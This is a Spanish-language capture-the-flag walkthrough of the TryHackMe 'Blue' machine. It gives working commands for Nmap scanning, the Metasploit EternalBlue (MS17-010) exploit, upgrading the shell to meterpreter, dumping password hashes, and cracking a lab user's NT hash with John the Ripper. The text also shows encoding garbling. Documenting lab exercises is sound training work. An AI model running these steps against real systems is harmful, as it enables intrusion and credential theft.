I"ıC<p>En esta ocasi√≥n vamos a resolver la m√°quina <em>Blue</em> de <em>TryHackMe</em>. Esta es una m√°quina f√°cil tanto en la intrusi√≥n como en la escalada de privilegios, por lo que no supondr√° ninguna complicaci√≥n a la hora de realizarla. Ya por el nombre de la m√°quina, podemos darnos una idea de por donde van los tiros, ¬øquiz√° <code class="language-plaintext highlighter-rouge">EternalBlue</code>?</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos est√°n abiertos as√≠ como identificar la versi√≥n y servicios que corren en el activo. Para determinar que puertos est√°n abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;direcci√≥n IP&gt;
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;direcci√≥n IP&gt;
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que est√°n abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, ‚Äúgeneraremos m√°s ruido  ‚Äú, pero no pasa nada ¬øno? Al fin y al cabo estamos practicando en un entorno controlado y aqu√≠ somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resoluci√≥n DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no m√°s lentos que <em>valor</em> por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor informaci√≥n por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Para determinar la versi√≥n y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 &lt;direcci√≥n IP&gt;
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts b√°sicos de enumeraci√≥n</li>
  <li>sV - Versi√≥n y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¬øCu√°ntos puertos est√°n abiertos con un n√∫mero de puerto inferior a 1000?</li>
  <li>¬øA qu√© es vulnerable esta m√°quina?</li>
</ul>

<p>Estas preguntas son bastante f√°ciles de responder si realizamos un buen escaneo con <em>Nmap</em>. Para responder a la primera pregunta no hay donde perderse, bastar√° con introducir cu√°ntos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la m√°quina; a modo de pista, la plataforma nos da un ejemplo de respuesta: <em>ms08-067</em>.</p>

<p>Si recordamos, lo m√°s relevante que encontramos con nuestro escaneo de versiones y servicios con <em>Nmap</em>, es el puerto <code class="language-plaintext highlighter-rouge">445</code>, o servicio <code class="language-plaintext highlighter-rouge">Samba</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/2.png" alt="" /></p>

<p>De modo que procederemos a utilizar los scripts espec√≠ficos con los que cuenta <em>Nmap</em>, para detectar vulnerabilidades en un servicio <code class="language-plaintext highlighter-rouge">Samba</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/3.png" alt="" /></p>

<p>Para poder utilizarlos podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script="smb-vuln*" -p 445 &lt;direcci√≥n IP&gt; -oN smbScan
</code></pre></div></div>

<p>A continuaci√≥n se explican los par√°metros utilizados en el escaneo de vulnerabilidades del servicio <code class="language-plaintext highlighter-rouge">Samba</code> con <em>Nmap</em>:</p>

<ul>
  <li>script - Proporcionamos el script que queremos emplear; en este caso, como no ten√≠amos un script en particular a utilizar, a trav√©s de expresiones regulares, indicamos que queremos utilizar todos aquellos script que comiencen por <em>smb-vuln</em></li>
  <li>p - Especificamos a que puertos queremos aplicar este escaneo</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/4.png" alt="" /></p>

<p>Como podemos darnos cuenta, esta m√°quina es vulnerable a MS17-010, o tambi√©n conocido como <code class="language-plaintext highlighter-rouge">EternalBlue</code>.</p>

<h3 id="fase-de-explotaci√≥n"><a href="#header-3"></a>Fase De Explotaci√≥n</h3>

<p>Para esta segunda fase, <em>TryHackMe</em> realiza la fase de explotaci√≥n con el uso de <code class="language-plaintext highlighter-rouge">Metasploit</code>, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que est√° pasando por detr√°s, de modo que no aprendemos; sin embargo, en esta m√°quina en concreto, no es posible realizar un procedimiento manual, ya que la m√°quina <code class="language-plaintext highlighter-rouge">Blue</code>, est√° pensada para ser explotada mediante el uso de <code class="language-plaintext highlighter-rouge">Metasploit</code>.</p>

<p>Para hacer uso de <code class="language-plaintext highlighter-rouge">Metasploit</code> tendremos que abrir la aplicaci√≥n, para ello haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
</code></pre></div></div>

<p>Una vez hemos abierto <code class="language-plaintext highlighter-rouge">Metasploit</code>, procederemos a buscar aquello que queremos explotar, en este caso, MS17-010, o <code class="language-plaintext highlighter-rouge">EternalBlue</code>, cualquiera de las dos formas es v√°lidas.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search eternalblue
search ms17-010
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/5.png" alt="" /></p>

<p>Posteriormente elegiremos el <em>exploit</em> a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el <em>exploit</em> que vamos a utilizar.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/ms17_010_eternalblue
</code></pre></div></div>

<p>Una vez hemos seleccionado el <em>exploit</em>, procederemos a configurar tanto el <code class="language-plaintext highlighter-rouge">LHOST</code> como el <code class="language-plaintext highlighter-rouge">RHOST</code>, que dicho de otra forma, procederemos a introducir nuestra <em>IP</em>, y la <em>IP</em> de la m√°quina v√≠ctima.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/6.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set LHOST &lt;nuestra IP&gt; 
set RHOST &lt;IP v√≠ctima&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/7.png" alt="" /></p>

<p>Una vez hemos configurado dichos par√°metros, bastar√° con empezar con el ataque, consigui√©ndonos <code class="language-plaintext highlighter-rouge">Metasploit</code> una <em>shell</em> dentro de la m√°quina v√≠ctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/8.png" alt="" /></p>

<p>Una vez llegados a este punto, <em>TryHackMe</em> nos pide convertir nuestra <em>shell</em> actual, en <code class="language-plaintext highlighter-rouge">meterpreter</code>, para ello tendremos que abandonar nuestra sesi√≥n actual <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>.</p>

<p>Una vez fuera, tendremos que nuevamente buscar dentro de <code class="language-plaintext highlighter-rouge">Metasploit</code>, un m√≥dulo que nos permita pasar de una shell_ a <code class="language-plaintext highlighter-rouge">meterpreter</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search shell_to_meterpreter
</code></pre></div></div>

<p>Una vez hemos encontrado un m√≥dulo que nos sirva, tendremos que utilizarlo.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/multi/manage/shell_to_meterpreter
</code></pre></div></div>

<p>Y al igual que antes, tendremos que configurar cierto par√°metro para poder conseguir un <code class="language-plaintext highlighter-rouge">meterpreter</code>, en este caso, la sesi√≥n con la que est√°bamos trabajando antes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show options                                  
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/9.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions
set SESSION 1
run
</code></pre></div></div>

<p>La opci√≥n <code class="language-plaintext highlighter-rouge">sessions</code> nos permite listar todas las sesiones que tengamos activas; esto es √∫til si tenemos m√°s de una sesi√≥n activa, y necesitamos indicar una en particular.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/10.png" alt="" /></p>

<p>Una vez hemos conseguido un <code class="language-plaintext highlighter-rouge">meterpreter</code>, podemos volver a nuestra sesi√≥n.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions 1
</code></pre></div></div>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p><em>TryHackMe</em> nos indica que a trav√©s del comando ‚Äòmigrate <ID del="" proceso="">', podemos convertirnos en el usuario que est√° corriendo dicho proceso, sin embargo, esto no tiene ning√∫n sentido ya que somos de hecho un usuario con m√°ximos privilegios, somos 'NT AUTHORITY\SYSTEM', de modo que no tiene sentido migrar al usuario que ya somos.</ID></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/11.png" alt="" /></p>

<p>Antes de pasar a conseguir las ‚Äòflags‚Äô de la m√°quina, la plataforma nos sigue ense√±ando comandos √∫tiles de <code class="language-plaintext highlighter-rouge">Metasploit</code>, en este caso el comando ‚Äòhashdump‚Äô, con el cual podemos listar todos los usarios del sistema, as√≠ como sus contrase√±as <em>hasheadas</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/12.png" alt="" /></p>

<p>En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea <em>Guest</em>, o <em>Administrator</em>; finalmente, se nos pide <em>crackear</em> la contrase√±a de este usuario, para ello utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">John the Ripper</code>, en conjunto del diccionario <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>.</p>

<p>En caso de no contar con la herramienta <code class="language-plaintext highlighter-rouge">John the Ripper</code> instalada, podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install john
</code></pre></div></div>

<p>En nuestra m√°quina, crearemos un documento de texto que contenga la contrase√±a <em>hasheada</em> del usuario, podemos hacerlo de manera manual, o desde la misma terminal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" &gt;&gt; hash.txt
</code></pre></div></div>

<p>Una vez creado el archivo de texto, podemos pasar a <em>crackear</em> la contrase√±a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo john --format=NT --wordlist=direcci√≥n/del/diccionario/rockyou nombreArchivoTexto.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/13.png" alt="" /></p>

<p>Una vez hemos <em>crackeado</em> la contrase√±a que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas ‚Äòflags‚Äô. En este caso existe un total de 3 ‚Äòflags‚Äô, las cuales, seg√∫n indica la plataforma, est√°n escondidas en ubicaciones claves de un sistema <em>Windows</em>, por lo que es aconsejable aprender estas locaciones.</p>

<p>La primera ‚Äòflag‚Äô dice que se encuentra en la ra√≠z del sistema, dicho de otra forma, ‚ÄòDisco Local C‚Äô.</p>

<p>Para poder navegar dentro de la m√°quina v√≠ctima, podr√≠amos usar el mismo <code class="language-plaintext highlighter-rouge">meterpreter</code>, sin embargo, en este caso nos manejaremos a trav√©s de una <em>shell</em>, para ello ejecutaremos el comando <em>shell</em>. Una vez hecho esto, podemos ir hacia el directorio ‚ÄòC:\‚Äô, listar su contenido y encontrar la ‚Äòflag‚Äô.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\\
dir
type flag1.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/14.png" alt="" /></p>

<p>La segunda ‚Äòflag‚Äô dice que se encuentra en una ubicaci√≥n donde se almacenan las contrase√±as dentro de Windows, dicho de otra forma, ‚ÄòC:\Windows\System32\Config‚Äô.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Windows\System32\Config
dir
type flag2.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/15.png" alt="" /></p>

<p>La √∫ltima ‚Äòflag‚Äô dice que se encuentra en una ubicaci√≥n donde los administradores suelen tener guardadas cosas ‚Äúbastante interesantes‚Äù, personalmente no tengo idea de donde podr√≠a ser esta ubicaci√≥n as√≠ que procederemos a buscar el archivo <code class="language-plaintext highlighter-rouge">flag3.txt</code>, dentro de todo el sistema, para ello tendremos que ir a la ra√≠z del sistema, y empezar a buscar desde ah√≠:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd \
dir flag3.txt /s /p 
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/16.png" alt="" /></p>

<p>Dudo mucho que los administradores guarden archivos importantes en una ubicaci√≥n as√≠, no obstante es la plataforma la que nos comenta esto, y adem√°s, es aqu√≠ donde se encuentra la tercera y √∫ltima <code class="language-plaintext highlighter-rouge">flag</code>, de modo que nos dirigiremos a esa ubicaci√≥n para leer la ‚Äòflag‚Äô.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Users\Jon\Documents
dir  
type flag3.txt  
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/17.png" alt="" /></p>
:ET